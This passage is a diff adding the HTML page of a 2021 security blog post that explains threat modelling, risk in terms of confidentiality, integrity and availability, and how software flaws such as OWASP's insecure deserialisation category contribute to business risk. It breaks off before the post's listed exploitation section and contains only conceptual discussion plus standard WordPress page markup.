@@ -1,0 +1,827 @@
+<!DOCTYPE html>
+<html lang="en-GB">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="profile" href="https://gmpg.org/xfn/11">
+<link rel="pingback" href="./../xmlrpc.php">
+
+
+<title>Software Vulnerabilities and Business Risk &#8211; Spencer Drayton</title>
+<meta name="robots" content="max-image-preview:large">
+<link rel="alternate" type="application/rss+xml" title="Spencer Drayton &raquo; Feed" href="./../feed/index.html">
+<link rel="alternate" type="application/rss+xml" title="Spencer Drayton &raquo; Comments Feed" href="./../comments/feed/index.html">
+<link rel="alternate" type="application/rss+xml" title="Spencer Drayton &raquo; Software Vulnerabilities and Business Risk Comments Feed" href="./feed/index.html">
+<script type="text/javascript">
+/* <![CDATA[ */
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":".\/\/wp-includes\/js\/wp-emoji-release.min.js?ver=d807bb9ef10808c7172aab675a714555"}};
+/*! This file is auto-generated */
+!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"🏳️‍⚧️","🏳️​⚧️")?!1:!n(e,"🇺🇳","🇺​🇳")&&!n(e,"🏴󠁧󠁢󠁥󠁮󠁧󠁿","🏴​󠁧​󠁢​󠁥​󠁮​󠁧​󠁿");case"emoji":return!n(e,"🐦‍⬛","🐦​⬛")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+/* ]]> */
+</script>
+<style id="wp-emoji-styles-inline-css" type="text/css">img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}</style>
+<link rel="stylesheet" id="wp-block-library-css" href="./../wp-includes/css/dist/block-library/style.min.css?ver=d807bb9ef10808c7172aab675a714555" type="text/css" media="all">
+<style id="classic-theme-styles-inline-css" type="text/css">/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}</style>
+<style id="global-styles-inline-css" type="text/css">:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}</style>
+<link rel="stylesheet" id="coral-dark-style-css" href="./../wp-content/themes/coral-dark/style.css?ver=d807bb9ef10808c7172aab675a714555" type="text/css" media="all">
+<style id="coral-dark-style-inline-css" type="text/css">h1, h2, h3, h4, h5, h6 { font-family: 'Lucida Console', Monaco, monospace;}
+		h1.site-title, h3.site-title { font-family: 'Lucida Console', Monaco, monospace;}
+		h2.site-description, h4.site-description { font-family: 'Lucida Console', Monaco, monospace;}
+		
+		body, button, input, select, textarea {	font-size: 14px;}
+		h1.site-title, h3.site-title {
+			margin-top: 25px; 
+			font-size: 36px; 
+		}
+		h1.site-title a,
+		h1.site-title a:visited,
+		h1.site-title a:hover,
+		h1.site-title a:active,
+		h1.site-title a:focus,
+		h3.site-title a,
+		h3.site-title a:visited,
+		h3.site-title a:hover,
+		h3.site-title a:active,
+		h3.site-title a:focus {
+			color: #ffffff !important;
+		}
+		
+		h2.site-description, h4.site-description {
+			margin-top: -5px;
+			font-size: 14px;
+			color: #ffffff;
+		}
+		.custom-logo {max-height: 100px;}
+		@media screen and (min-width: 768px) {
+			.main-navigation {margin-top: 15px;}
+			#search1 {margin-top: 42px;}
+			#social1 {margin-top: 47px;}
+		}</style>
+<link rel="stylesheet" id="enlighterjs-css" href="./../wp-content/plugins/enlighter/cache/enlighterjs.min.css?ver=FEHentKvd4xOWg9" type="text/css" media="all">
+<script type="text/javascript" src="./../wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
+<script type="text/javascript" src="./../wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
+<script type="text/javascript" src="./../wp-content/themes/coral-dark/js/jquery.nivo.slider.pack.js?ver=3.2" id="nivo-slider-js"></script>
+<link rel="https://api.w.org/" href="./../wp-json/index.html">
+<link rel="alternate" title="JSON" type="application/json" href="./../wp-json/wp/v2/posts/374/index.html">
+<link rel="canonical" href="./index.html">
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="./../wp-json/oembed/1.0/embed/index.html?url=.%2F%2Finsecure-deserialisation%2F">
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="./../wp-json/oembed/1.0/embed/index.html?url=.%2F%2Finsecure-deserialisation%2F#038;format=xml">
+<meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett">
+<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>		<style type="text/css" id="wp-custom-css">/*
+You can add your own CSS here.
+
+Click the help icon above to learn more.
+*/</style>
+		</head>
+
+<body data-rsssl="1" class="post-template-default single single-post postid-374 single-format-standard wp-embed-responsive">
+<div id="page" class="hfeed site">
+	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
+
+	<header id="masthead" class="site-header grid-container" role="banner">
+		<div class="site-branding egrid  grid-35 tablet-grid-35 mobile-grid-100">
+												<h3 class="site-title"><a href="./../index.html" rel="home">Spencer Drayton</a></h3>
+					<h4 class="site-description">Information Security, Software Engineering</h4>
+					
+							
+		</div>
+<!-- .site-branding -->
+		<div id="headerright" class="grid-parent egrid  grid-65 tablet-grid-65 mobile-grid-100">
+			
+			<div id="social1" class="egrid  grid-60 tablet-grid-60 mobile-grid-100">
+							</div>
+			
+			<div id="search1" class="search  grid-40 tablet-grid-40 mobile-grid-100">
+				<div class="search-container">
+<form role="search" method="get" class="search-form" action=".//">
+	<fieldset>
+		<input type="search" class="search-field" placeholder="Search..." value="" name="s" title="Search for:">
+		<input type="submit" class="search-submit" value="">
+	</fieldset>
+</form>
+</div>			</div>
+		</div>
+
+		<nav id="site-navigation" class="main-navigation egrid grid-100 tablet-grid-100 mobile-grid-100" role="navigation">
+			<i id="menu-button" class="fa fa-bars collapsed"><span>  Menu</span></i>
+					</nav><!-- #site-navigation -->
+	</header><!-- #masthead -->
+
+		
+<!-- breadcrumbs from Yoast or NavXT plugins -->
+		
+	<div id="content" class="site-content grid-container">
+
+	<div id="primary" class="content-area egrid  grid-80 tablet-grid-80 mobile-grid-100 push-20 tablet-push-20">
+		<main id="main" class="site-main" role="main">
+
+		
+			
+<article id="post-374" class="post-374 post type-post status-publish format-standard has-post-thumbnail hentry category-application-security category-business-risk category-insecure-deserialisation category-java category-lateral-movement category-threat-modeling">
+	<header class="entry-header">
+		<h1 class="entry-title">Software Vulnerabilities and Business Risk</h1>
+		<div class="entry-meta">
+			<span class="posted-on"><a href="./index.html" rel="bookmark"><time class="entry-date published" datetime="2021-08-24T18:07:37+01:00">August 24, 2021</time><time class="updated" datetime="2021-09-13T15:11:02+01:00">September 13, 2021</time></a></span><span class="byline"> <span class="author vcard"><a class="url fn n" href="./../author/admin/index.html">spen440</a></span></span>		</div>
+<!-- .entry-meta -->
+	</header><!-- .entry-header -->
+
+	<div class="entry-content">
+		
+		
+	<div class="post-thumbnail">
+		<img width="800" height="665" src="./../wp-content/uploads/2021/09/pbox-exp_2-scaled-e1631522707550.jpeg" class="attachment-large size-large wp-post-image" alt="" decoding="async" fetchpriority="high" srcset="./../wp-content/uploads/2021/09/pbox-exp_2-scaled-e1631522707550.jpeg 800w, ./../wp-content/uploads/2021/09/pbox-exp_2-scaled-e1631522707550-300x249.jpeg 300w, ./../wp-content/uploads/2021/09/pbox-exp_2-scaled-e1631522707550-768x638.jpeg 768w, ./../wp-content/uploads/2021/09/pbox-exp_2-scaled-e1631522707550-210x175.jpeg 210w" sizes="(max-width: 800px) 100vw, 800px"><div class="ccfic"></div>	</div>
+<!-- .post-thumbnail -->
+
+	
+<p>For developers working with systems exposed to the internet, it&#8217;s difficult to avoid the influence that information security has on day to day work. Perhaps a recent penetration test by a third party has highlighted vulnerabilities that need addressing, or maybe the system has already suffered a security breach. There might be a requirement to demonstrate that the system is compliant with a particular security standard. Its also possible that the development team belongs to an enlightened organisation that understands why their software products need to be secure, and have measures in place within their development process to prevent and detect security vulnerabilities.</p>
+
+
+
+<p>Conversely, if a system is designed to sit in apparent safety behind a firewall, or on a separate internal network segment, or has no direct access to sensitive data, it&#8217;s not straightforward from a developer&#8217;s point of view to see how &#8211; or why &#8211; a system might be attacked.</p>
+
+
+
+<span id="more-374"></span>
+
+
+<h2 class="simpletoc-title">Table of Contents</h2>
+<ul class="simpletoc-list">
+<li>
+<a href="#background">Background</a>
+
+</li>
+<li>
+<a href="#defence-in-depth">Defence In Depth</a>
+
+</li>
+<li>
+<a href="#context-is-king">Context is king</a>
+
+</li>
+<li>
+<a href="#threat-modelling">Threat Modelling</a>
+
+</li>
+<li>
+<a href="#risk">Risk</a>
+
+</li>
+<li>
+<a href="#how-software-vulnerabilities-contribute-to-risk">How software vulnerabilities contribute to risk</a>
+
+
+<ul>
+<li>
+<a href="#insecure-deserialisation">Insecure Deserialisation</a>
+
+</li>
+<li>
+<a href="#java-serialisation">Java serialisation</a>
+
+</li>
+</ul>
+</li>
+<li>
+<a href="#unsafe-java-deserialisation-using-webgoat-as-an-example">Unsafe Java deserialisation using WebGoat as an example</a>
+
+
+<ul>
+<li>
+<a href="#explanation-of-the-vulnerability">Explanation of the vulnerability</a>
+
+</li>
+<li>
+<a href="#exploitation">Exploitation</a>
+
+</li>
+</ul>
+</li>
+<li>
+<a href="#deserialisation-vulnerabilities-in-the-wild">Deserialisation Vulnerabilities In The Wild</a>
+
+
+<ul>
+<li>
+<a href="#cve20179805">CVE-2017-9805</a>
+
+</li>
+</ul>
+</li>
+<li>
+<a href="#summary">Summary</a>
+</li>
+</ul>
+
+<h2 class="wp-block-heading" id="background">Background</h2>
+
+
+<p>Failure to understand how one vulnerable system can be commandeered to act as a link in an attack which chains multiple compromised systems together to achieve the attackers ultimate objective can lead to software security considerations being given low or even zero priority during development.</p>
+
+
+
+<p>Until recently, responsibility for information security tended to fall squarely within the remit of systems and infrastructure engineers. A common misconception is that the firewalls, endpoint security, intrusion prevention and detection controls, etc in place absolve developers of any need to think about security. But analysis of data breaches in recent years shows that attackers are now more than capable of exploiting software system vulnerabilities to bypass security controls.</p>
+
+
+
+<p>As a result, software developers now have a responsibility to take security seriously. But for those more used to story driven development, delivering functionality which satisfies user requirements on time and on budget, it can be very challenging to switch mindsets and start thinking like an attacker.</p>
+
+
+<h2 class="wp-block-heading" id="defence-in-depth">Defence In Depth</h2>
+
+
+<p>Security breaches can involve the compromise of several hosts across an internal network, with some hosts merely acting as an intermediate stepping stone in the chain of compromise. Just because an application doesn&#8217;t directly access high value information assets, it doesn&#8217;t mean that the underlying host can&#8217;t be used as a means of gaining access to the hosts that <em>do</em>.</p>
+
+
+
+<p>Maybe the information that the application manipulates isn&#8217;t considered a likely target, but that&#8217;s of little consequence if the software introduces vulnerabilities which, for example, allow the host file system to be used as a staging area for the exfiltration of sensitive data exfiltration, or permits arbitrary script execution which allows system account password hashes to be harvested remotely and cracked offline.</p>
+
+
+
+<p>Rather than assuming that infrastructure security controls will deal with every attack, taking a defence-in-depth approach not only protects local information assets but also plays a part in protecting the wider system &#8211; hindering, delaying and maybe even halting an attacker who is trying to move laterally through a network to reach the high value targets.</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../wp-content/uploads/2021/09/lat-move-001-1.png"><img decoding="async" src="./../wp-content/uploads/2021/09/lat-move-001-1-768x675.png" alt="" class="wp-image-465" width="571" height="501" srcset="./../wp-content/uploads/2021/09/lat-move-001-1-768x675.png 768w, ./../wp-content/uploads/2021/09/lat-move-001-1-300x264.png 300w, ./../wp-content/uploads/2021/09/lat-move-001-1-210x185.png 210w, ./../wp-content/uploads/2021/09/lat-move-001-1.png 874w" sizes="(max-width: 571px) 100vw, 571px"></a><figcaption><em>Over-reliance on perimeter, infrastructure based security controls can expedite an attacker&#8217;s lateral movement through a network.</em></figcaption></figure></div>
+
+
+
+<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow">
+<h2 class="wp-block-heading" id="context-is-king">Context is king</h2>
+
+
+<p>It&#8217;s important to view software system vulnerabilities in the context of the environment in which the system is deployed. Ultimately, the severity of a given software vulnerability should be assessed according to the risk it represents to the business, and this can vary depending on a number of factor environmental and temporal factors. A service which is vulnerable because it has a weak user authentication mechanism (for example) represents a high level risk if it is publicly accessible directly from the internet, but a lower level of risk if it is deployed on an isolated network accessible via a terminal located behind a locked door.</p>
+
+
+
+<p>Understanding how a software system interacts with its host environment, and analysing all the different ways in which those interactions could be compromised &#8211; a process commonly known as <a href="https://owasp.org/www-community/Threat_Modeling"><span class="has-inline-color has-luminous-vivid-amber-color">Threat Modelling</span></a> &#8211; is a crucial part of this process.</p>
+
+
+<h2 class="wp-block-heading" id="threat-modelling">Threat Modelling</h2>
+
+
+<p>Threat modelling is a type of risk assessment methodology, similar in concept to techniques used in other engineering disciplines such as <a href="https://en.wikipedia.org/wiki/Failure_mode,_effects,_and_criticality_analysis"><span class="has-inline-color has-luminous-vivid-amber-color">Failure Mode and Effect Criticality Analysis (FMECA)</span></a>.</p>
+
+
+
+<p>Threat modelling involves activities which include:</p>
+
+
+
+<ul class="wp-block-list">
+<li>Identifying and classifying information assets according to sensitivity and value.</li>
+<li>Determining which information assets are potentially exposed by a software vulnerability.</li>
+<li>Considering what types of threat the system is likely to face in service.</li>
+<li>Assessing the likelihood of each type of threat being able to exploit a vulnerability.</li>
+<li>Assessing the impact on the business of an information asset being breached by a threat successfully exploiting a vulnerability.</li>
+</ul>
+
+
+
+<p>This process allows an organisation to categorise known software vulnerabilities in terms of the business risk that they actually represent in the target deployment environment. Armed with this knowledge, an organisation can then rank vulnerabilities by criticality and select an appropriate order and method of treatment to reduce overall business risk to an acceptable level.</p>
+</div></div>
+
+
+
+<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow">
+<h2 class="wp-block-heading" id="risk">Risk</h2>
+
+
+<p>So what do we mean by risk ?</p>
+
+
+
+<ul class="wp-block-list">
+<li>IT organisations deal with <span class="has-inline-color has-white-color">information </span>&#8211; i.e. facts and figures which have meaning in a specific context.</li>
+<li>
+<span class="has-inline-color has-white-color">Information </span>within an organisation is typically viewed as a collection of <span class="has-inline-color has-white-color">assets</span>, where each asset has a <span class="has-inline-color has-white-color">value </span>which reflects its importance to the organisation.</li>
+<li>This <span class="has-inline-color has-white-color">value </span>can be derived from many factors, but is generally proportional to the seriousness of sustaining a degradation to one of three properties used to express the security state an information asset, namely: <span class="has-inline-color has-white-color">Confidentiality</span>, <span class="has-inline-color has-white-color">Integrity </span>and <span class="has-inline-color has-white-color">Availability </span>(or &#8220;<strong><a href="https://www.iso.org/obp/ui/#iso:std:iso-iec:27000:ed-5:v1:en:term:3.28"><span class="has-inline-color has-luminous-vivid-amber-color">CIA</span></a></strong>&#8220;).</li>
+<li>These properties can be degraded through a variety of possible scenarios involving potential <span class="has-inline-color has-white-color">threats</span>, each of which needs to be assessed to quantify its contribution to the potential business risk to the organisation.</li>
+<li>Information systems can contain flaws, or <span class="has-inline-color has-white-color">vulnerabilities</span>, which can adversely affect the <span class="has-inline-color has-white-color">CIA</span><strong><span class="has-inline-color has-white-color"> </span></strong>of the information <span class="has-inline-color has-white-color">assets </span>it manipulates.</li>
+<li>The level of <span class="has-inline-color has-white-color">risk </span>is assessed by considering how <span class="has-inline-color has-white-color">likely </span>it is that a <span class="has-inline-color has-white-color">threat </span>will <span class="has-inline-color has-white-color">exploit </span>a <span class="has-inline-color has-white-color">vulnerability</span> and what the <span class="has-inline-color has-white-color">impact </span>could be given the <span class="has-inline-color has-white-color">value </span>of affected information <span class="has-inline-color has-white-color">asset</span>.</li>
+<li>
+<span class="has-inline-color has-white-color">Vulnerabilities </span>present in software systems expose the organisation to <span class="has-inline-color has-white-color">risk </span>in a number of ways, including:<ul>
+<li><em>Financial loss</em></li>
+<li><em>Operational capacity reduction</em></li>
+<li><em>Legal or regulatory penalties</em></li>
+<li><em>Reputational damage</em></li>
+<li><em>Harm or damage to persons and property.</em></li>
+</ul>
+</li>
+</ul>
+
+
+
+<p></p>
+</div></div>
+
+
+<h2 class="wp-block-heading" id="how-software-vulnerabilities-contribute-to-risk">How software vulnerabilities contribute to risk</h2>
+
+
+<p>There are institutions within the information security community that collate and distribute guidance aimed at improving information security.</p>
+
+
+
+<p>One of these is the <span class="has-inline-color has-white-color">Open Web Application Security Project</span> (<a href="https://owasp.org/"><span class="has-inline-color has-luminous-vivid-amber-color">OWASP</span></a>), which provides &#8211; amongst many other things &#8211; a ranking of and remediation guidance for the <a href="https://owasp.org/www-project-top-ten/"><span class="has-inline-color has-luminous-vivid-amber-color">top 10 most critical web application security risks</span></a>.</p>
+
+
+
+<p>To understand how software vulnerabilities contribute to business risk, it&#8217;s worth picking one item from the 2017 version of the OWASP top 10 list and using it to outline a simple example, to help give some context to what can seem like quite an abstract concept. I&#8217;ve chosen &#8220;<a href="A8:2017 - Insecure Deserialisation"><span class="has-inline-color has-luminous-vivid-amber-color">A8:2017 &#8211; Insecure Deserialisation</span></a>&#8221; in this instance<span class="has-inline-color has-vivid-red-color">*</span>. There are countless other possible examples that would also fit here, but I&#8217;ve chosen this one because it seems easier to attribute the link between cause and effect directly to coding flaws, compared to some of the other risks types identified by OWASP. </p>
+
+
+
+<p><span class="has-inline-color has-vivid-red-color">*</span><em>The 2021 version of the OWASP Top 10 which was in peer review at the time of writing proposes merging Insecure Deserialisation into a new more general category entitled &#8220;A08:2021-Software and Data Integrity Failures&#8221;.</em></p>
+
+
+<h3 class="wp-block-heading" id="insecure-deserialisation">Insecure Deserialisation</h3>
+
+
+<p>Serialisation has a multitude of uses &#8211; one of these is to facilitate the communication of objects in distributed architectures, such as <a href="https://www.corba.org/"><span class="has-inline-color has-luminous-vivid-amber-color">CORBA</span></a>, <a href="https://docs.oracle.com/javase/tutorial/rmi/overview.html"><span class="has-inline-color has-luminous-vivid-amber-color">RMI</span></a><span class="has-inline-color has-luminous-vivid-amber-color"> </span>and <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/86b9cf84-df2e-4f0b-ac22-1b957627e1ca"><span class="has-inline-color has-luminous-vivid-amber-color">DCOM</span></a>.</p>
+
+
+
